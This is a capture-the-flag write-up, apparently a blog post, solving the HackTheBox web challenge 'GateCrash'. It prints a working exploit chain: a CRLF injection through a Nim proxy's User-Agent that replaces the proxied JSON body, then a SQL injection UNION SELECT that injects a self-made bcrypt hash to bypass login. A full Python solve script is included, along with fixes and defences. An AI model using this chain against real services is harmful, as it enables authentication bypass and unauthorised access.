---
layout: post
title: "GateCrash"
date: 2027-07-29 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, crlf-injection, sqli, bcrypt, nim, go, CWE-93, CWE-89]
---

## Overview

GateCrash is an Easy HTB Web challenge built on a two-service Nim + Go stack. A [CRLF injection](https://cwe.mitre.org/data/definitions/93.html) in the Nim proxy's User-Agent processing allows an attacker to replace the downstream JSON body, which is then exploited via a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) UNION SELECT that injects a known bcrypt hash — bypassing authentication without cracking any credentials.

---

## Architecture

```
Client → control_api (Nim/Jester, :1337) → user_api (Go/SQLite, :9090 internal)
```

- **control_api**: accepts `POST /user` with form `username`/`password`, validates against a SQL-injection wordlist, serialises to JSON, and proxies the login to user_api. If user_api returns 200, it reads `/flag.txt` and returns it.
- **user_api**: accepts `POST /login` with a JSON body, runs a raw-concatenated SQLite query, fetches the matching row, and calls `bcrypt.CompareHashAndPassword(stored_hash, supplied_password)`.

The flag is only readable by control_api — user_api never returns it directly.

---

## The Technique

### 1. CRLF Injection via `decodeUrl` + `newHttpClient` ([CWE-93](https://cwe.mitre.org/data/definitions/93.html))

The Nim proxy contains this code:

```nim
let userAgent = decodeUrl(request.headers["user-agent"])
let client = newHttpClient(userAgent)
client.headers = newHttpHeaders({"Content-Type": "application/json"})
let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)
```

Nim 1.2.4's `httpclient` inserts the user-agent string **verbatim** into the raw HTTP stream without sanitising CR or LF bytes. `decodeUrl()` converts `%0D%0A` → literal `\r\n` before the string is passed to `newHttpClient`. So a User-Agent of:

```
Mozilla/7.0%0D%0A%0D%0A{"username":"...","password":"..."}
```

…causes the double CRLF to terminate the HTTP headers section early — everything after it becomes the body that Go's user_api reads. The proxy's `containsSqlInjection()` wordlist check only covers `username` and `password` form fields, not the User-Agent.

### 2. SQLi UNION SELECT + bcrypt hash injection ([CWE-89](https://cwe.mitre.org/data/definitions/89.html))

The internal user_api has this vulnerable query:

```go
row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")
```

The query returns `(id, username, password)`. Injecting:

```
' UNION SELECT 1,'x','<bcrypt_hash>'-- -
```

…returns a synthetic row with a bcrypt hash **we computed** for a known password. `bcrypt.CompareHashAndPassword(hash, "Password1")` passes because we generated `hash = bcrypt("Password1")` ourselves — no cracking required.

---

## Key Gotcha: Nim Header Order

Discovered via a Python intercept server run inside the Docker container to capture raw bytes:

```
POST /login HTTP/1.1
Host: 127.0.0.1:9999
Connection: Keep-Alive
content-length: 35          ← sent BEFORE user-agent
content-type: application/json
user-agent: Mozilla/7.0
Content-Length: 10          ← injected duplicate
[blank line]
body
```

Nim sends `content-length` **before** `user-agent`. Injecting a second `Content-Length` inside the CRLF payload creates a duplicate — Go 1.20's `net/http` rejects it with 400 Bad Request.

The fix: **don't inject Content-Length**. Instead, pad the real `username`/`password` so Nim's auto-computed content-length matches the injected body's byte length exactly:

```
Nim body formula: {"username":"<U>","password":"<P>"} = 29 + len(U) + len(P) bytes
Injected body:    {"username":"' UNION SELECT 1,'x','<60c-bcrypt>'-- -","password":"Password1"} = 125 bytes
Equation:         29 + len(U) + len(P) = 125  →  len(U) = len(P) = 48
```

---

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
import urllib.parse, requests, bcrypt, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "TARGET:PORT"
URL = f"http://{TARGET}/user"

known_pass = b"Password1"
bcrypt_hash = bcrypt.hashpw(known_pass, bcrypt.gensalt()).decode()
assert len(bcrypt_hash) == 60

sqli_user = f"' UNION SELECT 1,'x','{bcrypt_hash}'-- -"
injected_body = f'{{"username":"{sqli_user}","password":"{known_pass.decode()}"}}'
assert len(injected_body) == 125

real_user = real_pass = "a" * 48

raw_ua = f"Mozilla/7.0\r\n\r\n{injected_body}"
encoded_ua = urllib.parse.quote(raw_ua, safe="")

resp = requests.post(URL, data={"username": real_user, "password": real_pass},
                     headers={"User-Agent": encoded_ua}, timeout=20)
print(resp.text)
```

Run against the spawned instance:

```bash
python3 solve.py <host>:<port>
```

Returns the flag: `HTB{...}`

---

## Why It Worked

Nim 1.2.4's `httpclient` trusts the caller-supplied user-agent string to be a valid HTTP token and inserts it byte-for-byte into the raw wire format. When `decodeUrl()` runs first, percent-encoded CRLF sequences become literal control bytes before `newHttpClient` ever sees them. The result is that the attacker controls the entire body of the proxied request.

The proxy-layer wordlist (`containsSqlInjection`) never inspects the User-Agent, so the injected body reaches Go's user_api unguarded, where the raw string concatenation in the SQL query accepts the UNION SELECT payload.

The bcrypt variant of the attack is necessary here because the application verifies the hash **application-side** (`bcrypt.CompareHashAndPassword`) rather than in a WHERE clause — comment-out bypasses (`administrator'-- -`) return the victim's real stored hash, which doesn't match any attacker-supplied password. By injecting a self-generated hash, the attacker manufactures a valid credential pair at exploit time.

---

## Fix / Defense

**control_api** — strip CR/LF before passing to `newHttpClient`, or upgrade Nim past [CVE-2021-41950](https://nvd.nist.gov/vuln/detail/CVE-2021-41950):

```nim
let rawUA = request.headers.getOrDefault("user-agent", "Mozilla/5.0")
let userAgent = rawUA.replace("\r", "").replace("\n", "")
let client = newHttpClient(userAgent)
```

**user_api** — parameterized queries:

```go
row := db.QueryRow("SELECT * FROM users WHERE username = ?", user.Username)
```
